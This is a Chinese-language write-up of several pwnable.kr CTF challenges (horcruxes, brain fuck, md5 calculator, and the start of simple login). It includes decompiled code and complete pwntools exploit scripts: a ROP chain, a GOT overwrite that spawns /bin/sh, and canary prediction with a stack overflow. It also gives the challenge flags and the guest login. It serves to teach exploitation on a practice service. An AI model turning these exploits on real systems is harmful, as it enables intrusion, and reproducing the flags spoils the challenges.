首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh horcruxes@pwnable.kr -p2222
horcruxes@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Sat Jun 10 02:35:26 2023 from 223.38.36.141
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
horcruxes@pwnable:~$ ls -la
total 36
drwxr-x---   4 root horcruxes  4096 Aug  8  2018 .
drwxr-xr-x 117 root root       4096 Nov 10  2022 ..
-rwxr-xr-x   1 root root      12424 Aug  8  2018 horcruxes
dr-xr-xr-x   2 root root       4096 Aug  8  2018 .irssi
drwxr-xr-x   2 root root       4096 Aug  8  2018 .pwntools-cache
-rw-r--r--   1 root root        131 Aug  8  2018 readme
```

发现两个关键文件：`horcruxes`和`readme`。先来看看`readme`，并查看`horcruxes`的文件保护情况。

```bash
horcruxes@pwnable:~$ cat readme
connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege.
rop it to read the flag.
horcruxes@pwnable:~$ checksec ./horcruxes
[*] '/home/horcruxes/horcruxes'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x809f000)
```

一旦`nc`连接到`9032`端口，二进制文件`horcruxes`（含有flag）将在`horcruxes_pwn`权限下执行。我们可以把`horcruxes`下载到本地。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
shell = ssh(user='horcruxes', host='pwnable.kr', port=2222, password='guest')
shell.download("/home/horcruxes/horcruxes", "./horcruxes")
```

用`pwndbg`对二进制文件`horcruxes`进行分析。先反编译主函数，发现程序调用了三个自定义函数`hint*()`，`init_ABCDEFG()`和`ropme()`。太长了，要不用`IDA Pro`反汇编再审计代码。

```assembly
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ gdb ./horcruxes 
pwndbg> disass main
Dump of assembler code for function main:
   0x0809ff24 <+0>:     lea    ecx,[esp+0x4]
   0x0809ff28 <+4>:     and    esp,0xfffffff0
   0x0809ff2b <+7>:     push   DWORD PTR [ecx-0x4]
   0x0809ff2e <+10>:    push   ebp
   0x0809ff2f <+11>:    mov    ebp,esp
   0x0809ff31 <+13>:    push   ecx
   0x0809ff32 <+14>:    sub    esp,0x14
   0x0809ff35 <+17>:    mov    eax,ds:0x80a2064
   0x0809ff3a <+22>:    push   0x0
   0x0809ff3c <+24>:    push   0x2
   0x0809ff3e <+26>:    push   0x0
   0x0809ff40 <+28>:    push   eax
   0x0809ff41 <+29>:    call   0x809fcf0 <setvbuf@plt>
   0x0809ff46 <+34>:    add    esp,0x10
   0x0809ff49 <+37>:    mov    eax,ds:0x80a2060
   0x0809ff4e <+42>:    push   0x0
   0x0809ff50 <+44>:    push   0x2
   0x0809ff52 <+46>:    push   0x0
   0x0809ff54 <+48>:    push   eax
   0x0809ff55 <+49>:    call   0x809fcf0 <setvbuf@plt>
   0x0809ff5a <+54>:    add    esp,0x10
   0x0809ff5d <+57>:    sub    esp,0xc
   0x0809ff60 <+60>:    push   0x3c
   0x0809ff62 <+62>:    call   0x809fc90 <alarm@plt>
   0x0809ff67 <+67>:    add    esp,0x10
   0x0809ff6a <+70>:    call   0x80a0324 <hint>             # 调用函数 hint
   0x0809ff6f <+75>:    call   0x80a0177 <init_ABCDEFG>     # 调用函数 init_ABCDEFG 
   0x0809ff74 <+80>:    sub    esp,0xc
   0x0809ff77 <+83>:    push   0x0
   0x0809ff79 <+85>:    call   0x809fc20 <seccomp_init@plt>
   0x0809ff7e <+90>:    add    esp,0x10
   0x0809ff81 <+93>:    mov    DWORD PTR [ebp-0xc],eax
   0x0809ff84 <+96>:    push   0x0
   0x0809ff86 <+98>:    push   0xad
   0x0809ff8b <+103>:   push   0x7fff0000
   0x0809ff90 <+108>:   push   DWORD PTR [ebp-0xc]
   0x0809ff93 <+111>:   call   0x809fc60 <seccomp_rule_add@plt>
   0x0809ff98 <+116>:   add    esp,0x10
   0x0809ff9b <+119>:   push   0x0
   0x0809ff9d <+121>:   push   0x5
   0x0809ff9f <+123>:   push   0x7fff0000
   0x0809ffa4 <+128>:   push   DWORD PTR [ebp-0xc]
   0x0809ffa7 <+131>:   call   0x809fc60 <seccomp_rule_add@plt>
   0x0809ffac <+136>:   add    esp,0x10
   0x0809ffaf <+139>:   push   0x0
   0x0809ffb1 <+141>:   push   0x3
   0x0809ffb3 <+143>:   push   0x7fff0000
   0x0809ffb8 <+148>:   push   DWORD PTR [ebp-0xc]
   0x0809ffbb <+151>:   call   0x809fc60 <seccomp_rule_add@plt>
   0x0809ffc0 <+156>:   add    esp,0x10
   0x0809ffc3 <+159>:   push   0x0
   0x0809ffc5 <+161>:   push   0x4
   0x0809ffc7 <+163>:   push   0x7fff0000
   0x0809ffcc <+168>:   push   DWORD PTR [ebp-0xc]
   0x0809ffcf <+171>:   call   0x809fc60 <seccomp_rule_add@plt>
   0x0809ffd4 <+176>:   add    esp,0x10
   0x0809ffd7 <+179>:   push   0x0
   0x0809ffd9 <+181>:   push   0xfc
   0x0809ffde <+186>:   push   0x7fff0000
   0x0809ffe3 <+191>:   push   DWORD PTR [ebp-0xc]
   0x0809ffe6 <+194>:   call   0x809fc60 <seccomp_rule_add@plt>
   0x0809ffeb <+199>:   add    esp,0x10
   0x0809ffee <+202>:   sub    esp,0xc
   0x0809fff1 <+205>:   push   DWORD PTR [ebp-0xc]
   0x0809fff4 <+208>:   call   0x809fc80 <seccomp_load@plt>
   0x0809fff9 <+213>:   add    esp,0x10
   0x0809fffc <+216>:   call   0x80a0009 <ropme>        # 调用函数 ropme
   0x080a0001 <+221>:   mov    ecx,DWORD PTR [ebp-0x4]
   0x080a0004 <+224>:   leave  
   0x080a0005 <+225>:   lea    esp,[ecx-0x4]
   0x080a0008 <+228>:   ret    
End of assembler dump.
```

用`IDA Pro 32bit`打开二进制文件`horcruxes`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+Ch] [ebp-Ch]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  alarm(0x3Cu);
  hint();
  init_ABCDEFG();
  v4 = seccomp_init(0);
  seccomp_rule_add(v4, 2147418112, 173, 0);
  seccomp_rule_add(v4, 2147418112, 5, 0);
  seccomp_rule_add(v4, 2147418112, 3, 0);
  seccomp_rule_add(v4, 2147418112, 4, 0);
  seccomp_rule_add(v4, 2147418112, 252, 0);
  seccomp_load(v4);
  return ropme();
}
```

双击`hint()`看到以下内容，让我们收集七个魂器并摧毁它。好家伙！~~可是我是麻瓜呐！~~

```c
int hint()
{
  puts("Voldemort concealed his splitted soul inside 7 horcruxes.");
  return puts("Find all horcruxes, and destroy it!\n");
}
```

来看`init_ABCDEFG()`函数，这七个字母可能分别代表不同的魂器吧。~~来自麻瓜的猜想。~~

```c
int init_ABCDEFG()
{
  int result; // eax
  unsigned int buf; // [esp+8h] [ebp-10h] BYREF
  int fd; // [esp+Ch] [ebp-Ch]

  fd = open("/dev/urandom", 0);
  if ( read(fd, &buf, 4u) != 4 )
  {
    puts("/dev/urandom error");
    exit(0);
  }
  close(fd);
  srand(buf);
  a = -559038737 * rand() % 0xCAFEBABE;
  b = -559038737 * rand() % 0xCAFEBABE;
  c = -559038737 * rand() % 0xCAFEBABE;
  d = -559038737 * rand() % 0xCAFEBABE;
  e = -559038737 * rand() % 0xCAFEBABE;
  f = -559038737 * rand() % 0xCAFEBABE;
  g = -559038737 * rand() % 0xCAFEBABE;
  result = f + e + d + c + b + a + g;
  sum = result;
  return result;
}
```

再来看看`ropme()`中的代码，这函数名真够直白的哈。其中`get()`函数存在栈溢出漏洞，可以用`0x74+0x4`个字节填充`padding`。

```c
int ropme()
{
  char s[100]; // [esp+4h] [ebp-74h] BYREF
  int v2; // [esp+68h] [ebp-10h] BYREF
  int fd; // [esp+6Ch] [ebp-Ch]

  printf("Select Menu:");
  __isoc99_scanf("%d", &v2);
  getchar();
  if ( v2 == a )
  {
    A();
  }
  else if ( v2 == b )
  {
    B();
  }
  else if ( v2 == c )
  {
    C();
  }
  else if ( v2 == d )
  {
    D();
  }
  else if ( v2 == e )
  {
    E();
  }
  else if ( v2 == f )
  {
    F();
  }
  else if ( v2 == g )
  {
    G();
  }
  else
  {
    printf("How many EXP did you earned? : ");
    gets(s);
    if ( atoi(s) == sum )
    {
      fd = open("flag", 0);     // 尝试直接利用栈溢出漏洞劫持程序输出flag未果
      s[read(fd, s, 0x64u)] = 0;
      puts(s);
      close(fd);
      exit(0);
    }
    puts("You'd better get more experience to kill Voldemort");
  }
  return 0;
}
```

我直接把这几个魂器放一块吧。

```c
int A()
{
  return printf("You found \"Tom Riddle's Diary\" (EXP +%d)\n", a);         // 汤姆·里德尔的日记
}

int B()
{
  return printf("You found \"Marvolo Gaunt's Ring\" (EXP +%d)\n", b);       // 马沃罗·冈特的戒指
}

int C()
{
  return printf("You found \"Helga Hufflepuff's Cup\" (EXP +%d)\n", c);     // 赫奇帕奇的金杯
}

int D()
{
  return printf("You found \"Salazar Slytherin's Locket\" (EXP +%d)\n", d);  // 斯莱特林挂坠盒
}

int E()
{
  return printf("You found \"Rowena Ravenclaw's Diadem\" (EXP +%d)\n", e);   // 拉文克劳的金冕
}

int F()
{
  return printf("You found \"Nagini the Snake\" (EXP +%d)\n", f);           // 纳吉尼
}

int G()
{
  return printf("You found \"Harry Potter\" (EXP +%d)\n", g);              // 哈利·波特
}
```

编写`Python代码`进行求解，可以得到`flag`：`Magic_spell_1s_4vad4_K3daVr4!`。

```python
from pwn import *
import re

# shell = ssh(user='horcruxes', host='pwnable.kr', port=2222, password='guest')
# shell.download("/home/horcruxes/horcruxes", "./horcruxes")
# io = shell.process('./horcruxes')
io = remote('pwnable.kr', 9032)
elf = ELF('./horcruxes')
A_addr = elf.symbols['A']  # 0x809fe4b
log.success("Tom Riddle's Diary => %s", hex(A_addr))
B_addr = elf.symbols['B']  # 0x809fe6a
log.success("Marvolo Gaunt's Ring => %s", hex(B_addr))
C_addr = elf.symbols['C']  # 0x809fe89
log.success("Helga Hufflepuff's Cup => %s", hex(C_addr))
D_addr = elf.symbols['D']  # 0x809fea8
log.success("Salazar Slytherin's Locket => %s", hex(D_addr))
E_addr = elf.symbols['E']  # 0x809fec7
log.success("Rowena Ravenclaw's Diadem => %s", hex(E_addr))
F_addr = elf.symbols['F']  # 0x809fee6
log.success("Nagini the Snake => %s", hex(F_addr))
G_addr = elf.symbols['G']  # 0x809ff05
log.success("Harry Potter => %s", hex(G_addr))
ropme_addr = elf.symbols['ropme']  # 0x80a0009
call_ropme = 0x809fffc
io.sendlineafter(b'Select Menu:', b'1')
io.recvuntil(b'How many EXP did you earned? : ')
padding = b'A'*(0x74+0x4)
payload = padding + p32(A_addr) + p32(B_addr) + p32(C_addr) + p32(D_addr) + p32(E_addr) + p32(F_addr) + p32(G_addr) + p32(call_ropme)
io.sendline(payload)
sleep(2)
msg = io.recv(1024).decode()
log.info(msg)
matches = re.findall(r'([\w-][\d]+)', msg)
result = sum(list(map(int, matches)))
log.success('result => {}'.format(result))
io.sendline(b'1')
io.recvuntil(b'How many EXP did you earned? : ')
io.sendline(str(result).encode())
flag = io.recvline().decode()   # Magic_spell_1s_4vad4_K3daVr4!
log.success('Flag: %s' % flag) 
io.close()
```

利用栈溢出漏洞ROP打败伏地魔的过程就很丝滑！

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ python horcruxes.py
[+] Opening connection to pwnable.kr on port 9032: Done
[*] '/home/tyd/ctf/pwn/pwnable.kr/horcruxes'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x809f000)
[+] Tom Riddle's Diary => 0x809fe4b
[+] Marvolo Gaunt's Ring => 0x809fe6a
[+] Helga Hufflepuff's Cup => 0x809fe89
[+] Salazar Slytherin's Locket => 0x809fea8
[+] Rowena Ravenclaw's Diadem => 0x809fec7
[+] Nagini the Snake => 0x809fee6
[+] Harry Potter => 0x809ff05
[*] You'd better get more experience to kill Voldemort
    You found "Tom Riddle's Diary" (EXP +731354578)
    You found "Marvolo Gaunt's Ring" (EXP +1633347723)
    You found "Helga Hufflepuff's Cup" (EXP +-1826248693)
    You found "Salazar Slytherin's Locket" (EXP +-1251281593)
    You found "Rowena Ravenclaw's Diadem" (EXP +-1441674942)
    You found "Nagini the Snake" (EXP +2109566384)
    You found "Harry Potter" (EXP +841356444)
    Select Menu:
[+] result => 796419901
[+] Flag: Magic_spell_1s_4vad4_K3daVr4!
[*] Closed connection to pwnable.kr port 9032
```

------

### brain fuck

这是**Pwnable.kr**的第二十二个挑战`brain fuck`，来自**[Rookiss]**部分。

```bash
I made a simple brain-fuck language emulation program written in C. 
The [ ] commands are not implemented yet. However the rest functionality seems working fine. 
Find a bug and exploit it to get a shell. 

Download : http://pwnable.kr/bin/bf
Download : http://pwnable.kr/bin/bf_libc.so

Running at : nc pwnable.kr 9001
```

`wget`下载二进制文件`bf`和相应的`bf_libc.so`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr/bf]
└─$ wget http://pwnable.kr/bin/bf

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr/bf]
└─$ wget http://pwnable.kr/bin/bf_libc.so

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr/bf]
└─$ sudo chmod +x ./bf 
```

先`file ./bf`查看文件类型，再`checksec --file=./bf`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr/bf]
└─$ file ./bf        
./bf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=190d45832c271de25448cefe52fbd15ea9ed5e65, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr/bf]
└─$ checksec --file=./bf           
[*] '/home/tyd/ctf/pwn/pwnable.kr/bf/bf'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

使用`IDA pro 32bit`打开附件`bf`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t i; // [esp+28h] [ebp-40Ch]
  char s[1024]; // [esp+2Ch] [ebp-408h] BYREF
  unsigned int v6; // [esp+42Ch] [ebp-8h]

  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  p = (int)&tape;    // 变量tape的内存地址被转换成int型后保存在p中
  puts("welcome to brainfuck testing system!!");
  puts("type some brainfuck instructions except [ ]");
  memset(s, 0, sizeof(s));
  fgets(s, 1024, stdin);
  for ( i = 0; i < strlen(s); ++i )
    do_brainfuck(s[i]);
  return 0;
}
```

变量`tape`的内存地址被转换成`int`型后保存在`p`中，需要注意的是`p`和`tape`都位于`.bss`段，相当于全局变量。

```assembly
.bss:0804A080 p               dd ?                    ; DATA XREF: do_brainfuck:loc_80485FE↑r
.bss:0804A080                                         ; do_brainfuck+2A↑w ...
.bss:0804A084                 align 20h
.bss:0804A0A0 tape            db    ? ;               ; DATA XREF: main+6D↑o
```

而`.bss`段前面的代码就是程序的`got`表，距离很近，很让人想修改。

```assembly
.got.plt:0804A000 _got_plt        segment dword public 'DATA' use32
.got.plt:0804A000                 assume cs:_got_plt
.got.plt:0804A000                 ;org 804A000h
.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC
.got.plt:0804A000                                         ; DATA XREF: _init_proc+9↑o
.got.plt:0804A000                                         ; __libc_csu_init+B↑o ...
.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048430↑r
.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048430+6↑r
.got.plt:0804A00C off_804A00C     dd offset getchar       ; DATA XREF: _getchar↑r
.got.plt:0804A010 off_804A010     dd offset fgets         ; DATA XREF: _fgets↑r
.got.plt:0804A014 off_804A014     dd offset __stack_chk_fail
.got.plt:0804A014                                         ; DATA XREF: ___stack_chk_fail↑r
.got.plt:0804A018 off_804A018     dd offset puts          ; DATA XREF: _puts↑r
.got.plt:0804A01C off_804A01C     dd offset __gmon_start__
.got.plt:0804A01C                                         ; DATA XREF: ___gmon_start__↑r
.got.plt:0804A020 off_804A020     dd offset strlen        ; DATA XREF: _strlen↑r
.got.plt:0804A024 off_804A024     dd offset __libc_start_main
.got.plt:0804A024                                         ; DATA XREF: ___libc_start_main↑r
.got.plt:0804A028 off_804A028     dd offset setvbuf       ; DATA XREF: _setvbuf↑r
.got.plt:0804A02C off_804A02C     dd offset memset        ; DATA XREF: _memset↑r
.got.plt:0804A030 off_804A030     dd offset putchar       ; DATA XREF: _putchar↑r
.got.plt:0804A030 _got_plt        ends
```

程序根据用户输入的内容，依次将每个字符传入`do_brainfuck()`函数执行。双击`do_brainfuck()`函数查看详情：

```c
int __cdecl do_brainfuck(char a1)
{
  int result; // eax
  _BYTE *v2; // ebx

  result = a1 - 43;
  switch ( a1 )
  {
    case '+':     // p所指向的值+1, 即tape+1
      result = p;
      ++*(_BYTE *)p;
      break;
    case ',':    // 输入
      v2 = (_BYTE *)p;
      result = getchar();
      *v2 = result;
      break;
    case '-':    // p所指向的值-1, 即tape-1
      result = p;
      --*(_BYTE *)p;
      break;
    case '.':    // 输出*p
      result = putchar(*(char *)p);
      break;
    case '<':    // p值-1
      result = --p;
      break;
    case '>':    // p值+1
      result = ++p;
      break;
    case '[':
      result = puts("[ and ] not supported.");
      break;
    default:
      return result;
  }
  return result;
}
```

将`p`指针移动到`fgets`函数在`got`表中的位置，泄露`fgets`在内存中的地址以计算`libc`的基地址，从而根据题目给出的`bf_libc.so`计算出`gets`和`system`的地址。我们构造`payload`的目的是通过指针在`.bss`段的读取和写入操作实现覆写`GOT`，编写`Python`代码求解，获得`shell`后输入`cat flag`得到`flag`：`BrainFuck? what a weird language..`。

```python
from pwn import *

elf = ELF('./bf')
got = {'fgets': elf.got['fgets'], 'memset': elf.got['memset'], 'putchar': elf.got['putchar']}
libc = ELF('./bf_libc.so')
offset = {'fgets': libc.symbols['fgets'], 'gets': libc.symbols['gets'], 'system': libc.symbols['system']}
main_addr = elf.symbols['main']  # 0x8048671
tape_addr = 0x804a0a0  # default p-pointer value

move_addr = lambda cur, new: b'<'*(cur-new) if cur > new else b'>'*(new-cur)
read_addr = lambda n: b'.>'*n + b'<'*n
write_addr = lambda n: b',>'*n + b'<'*n

payload = move_addr(tape_addr, got['fgets'])   # 将p指针从tape移动到fgets函数在GOT中的地址
payload += read_addr(4)    # 读取fgets函数在GOT中的地址
payload += write_addr(4)   # 将tape指针当前位置的值system_addr写入GOT中的fgets函数地址，以覆写该地址
payload += move_addr(got['fgets'], got['memset'])  # 将tape指针移动到memset函数在GOT中的地址
payload += write_addr(4)   # 将tape指针当前位置的值gets_addr写入GOT中的memset函数地址，以覆写该地址
payload += move_addr(got['memset'], got['putchar'])  # 将tape指针移动到putchar函数在GOT中的地址
payload += write_addr(4)   # 将tape指针当前位置的值main_addr写入GOT中的putchar函数地址，以覆写该地址
payload += b'.'  # 调用putchar函数，因为该地址被覆写了所以此时会返回到主函数 return main 
io = remote('pwnable.kr', 9001)
io.recvuntil(b'[ ]\n')
io.sendline(payload)
sleep(1)
fgets_addr = u32(io.recv(4).ljust(4, b'\x00'))
# fgets_addr = int.from_bytes(io.recv(4), byteorder='little', signed=False)
log.info('fgets_addr => %s' % hex(fgets_addr))
libc_base = fgets_addr - offset['fgets']
log.success('libc_base_addr => %s', hex(libc_base))
gets_addr = libc_base + offset['gets']
log.info('gets_addr => %s' % hex(gets_addr))
system_addr = libc_base + offset['system']
log.info('system_addr => %s' % hex(system_addr))
shellcode = p32(system_addr) + p32(gets_addr) + p32(main_addr) + b'/bin/sh'
io.sendline(shellcode)
io.interactive()
```

------

### md5 calculator

这是**Pwnable.kr**的第二十三个挑战`md5 calculator`，来自**[Rookiss]**部分。

```bash
We made a simple MD5 calculator as a network service.
Find a bug and exploit it to get a shell.

Download : http://pwnable.kr/bin/hash
hint : this service shares the same machine with pwnable.kr web service

Running at : nc pwnable.kr 9002
```

先把二进制文件`hash`下载并查看文件信息。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ wget http://pwnable.kr/bin/hash

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ sudo chmod +x ./hash

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ file ./hash     
./hash: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=89ebf47881a82f5a991199ae381f8284a46e0500, not stripped
                                                                                                      
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ checksec --file=./hash     
[*] '/home/tyd/ctf/pwn/pwnable.kr/hash'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

使用`IDA pro 32bit`打开附件`hash `，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int v5; // [esp+18h] [ebp-8h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  setvbuf(stdout, 0, 1, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("- Welcome to the free MD5 calculating service -");
  v3 = time(0);
  srand(v3);
  v6 = my_hash();
  printf("Are you human? input captcha : %d\n", v6);
  __isoc99_scanf("%d", &v5);
  if ( v6 != v5 )
  {
    puts("wrong captcha!");
    exit(0);
  }
  puts("Welcome! you are authenticated.");
  puts("Encode your data with BASE64 then paste me!");
  process_hash();
  puts("Thank you for using our service.");
  system("echo `date` >> log");
  return 0;
}
```

挺有意思的，看完程序的大致逻辑之后，`nc`进去走个流程：先输入`captcha`，然后输入一个`base64`加密的数据，程序将输出一个`MD5`值。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ nc pwnable.kr 9002
- Welcome to the free MD5 calculating service -
Are you human? input captcha : -651314993
-651314993
Welcome! you are authenticated.
Encode your data with BASE64 then paste me!
LTY1MTMxNDk5Mw==
MD5(data) : b3fd6020a1745ce75c30fb2363f7bbca
Thank you for using our service.
```

双击`my_hash()`函数查看详情：

```c
int my_hash()
{
  int i; // [esp+0h] [ebp-38h]
  char v2[4]; // [esp+Ch] [ebp-2Ch]
  int v3; // [esp+10h] [ebp-28h]
  int v4; // [esp+14h] [ebp-24h]
  int v5; // [esp+18h] [ebp-20h]
  int v6; // [esp+1Ch] [ebp-1Ch]
  int v7; // [esp+20h] [ebp-18h]
  int v8; // [esp+24h] [ebp-14h]
  int v9; // [esp+28h] [ebp-10h]
  unsigned int v10; // [esp+2Ch] [ebp-Ch]

  v10 = __readgsdword(0x14u);
  for ( i = 0; i <= 7; ++i )
    *(_DWORD *)&v2[4 * i] = rand();
  return v6 - v8 + v9 + v10 + v4 - v5 + v3 + v7;   // 返回captcha
}
```

我们可以利用`C`语言中生成伪随机数的方式来计算出`canary`。

```python
import ctypes
from pwn import *

libc = ctypes.CDLL('libc.so.6')
seed = int(libc.time(0))

io = remote('pwnable.kr', 9002)
io.recvuntil(b'Are you human? input captcha : ')
captcha = int(io.recvline()[:-1])
log.success('captcha => %d', captcha)
io.sendline(str(captcha).encode())
rands = [libc.rand() for _ in range(8)]
canary = (captcha-rands[4]+rands[6]-rands[7]-rands[2]+rands[3]-rands[1]-rands[5]) & 0xffffffff
log.success('canary => %#x', canary)
```

接着来看`process_hash()`函数，`fget`函数最多读取1024字节到`.bss`段上的变量`g_buf`，随后利用`Base64Decode`函数进行`Base64`解码，然后将返回值放入`calc_md5`进行`MD5`加密。而`v3`存在栈溢出漏洞，构造`payload`时可以先用`0x200`个字节的`padding`进行填充，写入`canary`后再用`12`个字节覆盖到栈帧，接着写入`call_system`进行系统调用。我们可以把`payload`写入到`.bss`段上，然后进行`base64`加密，最后加上`"/bin/sh"`获得`shell`脚本。

```c
unsigned int process_hash()
{
  int v1; // [esp+14h] [ebp-214h]
  char *ptr; // [esp+18h] [ebp-210h]
  char v3[512]; // [esp+1Ch] [ebp-20Ch] BYREF
  unsigned int v4; // [esp+21Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  memset(v3, 0, sizeof(v3));
  while ( getchar() != 10 )
    ;
  memset(g_buf, 0, sizeof(g_buf));
  fgets(g_buf, 1024, stdin);
  memset(v3, 0, sizeof(v3));
  v1 = Base64Decode(g_buf, v3);
  ptr = (char *)calc_md5(v3, v1);
  printf("MD5(data) : %s\n", ptr);
  free(ptr);
  return __readgsdword(0x14u) ^ v4;
}
```

编写`Python`代码求解，拿到`Shell`后输入`cat flag`得到`flag`。

提交`Canary, Stack guard, Stack protector.. what is the correct expression?`即可。

```python
import ctypes
from pwn import *

libc = ctypes.CDLL('libc.so.6')
# libc = ctypes.cdll.LoadLibrary('libc.so.6')
io = remote('pwnable.kr', 9002)
libc.srand(libc.time(0))
io.recvuntil(b'Are you human? input captcha : ')
captcha = int(io.recvline()[:-1])
log.success('captcha => %d', captcha)
io.sendline(str(captcha).encode())
rands = [libc.rand() for _ in range(8)]
canary = (captcha-rands[4]+rands[6]-rands[7]-rands[2]+rands[3]-rands[1]-rands[5]) & 0xffffffff
log.success('canary => %#x', canary)
call_system = 0x8049187
g_buf = 0x804B0E0  # .bss
process_hash = 0x8048f92
payload = cyclic(0x200) + p32(canary) + cyclic(0xc) + p32(call_system)
payload += p32(g_buf + len(b64e(payload))+4)
payload = b64e(payload).encode()
payload += b'/bin/sh\x00'
io.recvuntil(b'Encode your data with BASE64 then paste me!\n')
io.sendline(payload)
io.interactive()
```

------

### simple login

这是**Pwnable.kr**的第二十四个挑战`simple login`，来自**[Rookiss]**部分。

```bash
Can you get authentication from this server?

Download : http://pwnable.kr/bin/login

Running at : nc pwnable.kr 9003
```

先把二进制文件`login`下载并查看文件信息。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ wget http://pwnable.kr/bin/login 

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ sudo chmod +x ./login  

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ file ./login                         
./login: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=e09ec7145440153c4b3dedc3c7a8e328d9be6b55, not stripped
                                                                                                      
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ checksec --file=./login
[*] '/home/tyd/ctf/pwn/pwnable.kr/login'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

使用`IDA pro 32bit`打开附件`login`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+4h] [ebp-3Ch]
  int v5; // [esp+18h] [ebp-28h] BYREF
  _BYTE v6[30]; // [esp+1Eh] [ebp-22h] BYREF
  unsigned int v7; // [esp+3Ch] [ebp-4h]

  memset(v6, 0, sizeof(v6));
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  printf("Authenticate : ", v4);
  _isoc99_scanf("%30s", v6);
  memset(&input, 0, 0xCu);
  v5 = 0;
  v7 = Base64Decode(v6, &v5);
  if ( v7 > 0xC )
  {
    puts("Wrong Length");
  }
  else
  {
    memcpy(&input, v5, v7);
    if ( auth(v7) == 1 )
      correct();
  }
  return 0;
}
```

用户输入的字符串只有不超过`12`个字节能被复制到栈中，然而查看栈结构后发现`12`个字节就足以溢出到`ebp`寄存器啦。`$ebp`寄存器是`i386`架构中用来保存基址指针的寄存器，它能在函数调用期间维护栈帧。基址指针是用于访问栈帧的关键寄存器，它指向当前函数的栈帧的基地址。回到主函数，双击`auth()`函数查看详情：

```c
_BOOL4 __cdecl auth(int a1)
{
  char v2[8]; // [esp+14h] [ebp-14h] BYREF
  char *s2; // [esp+1Ch] [ebp-Ch]
  int v4; // [esp+20h] [ebp-8h] BYREF

  memcpy(&v4, &input, a1);
  s2 = (char *)calc_md5(v2, 12);
  printf("hash : %s\n", s2);
  return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
}
```

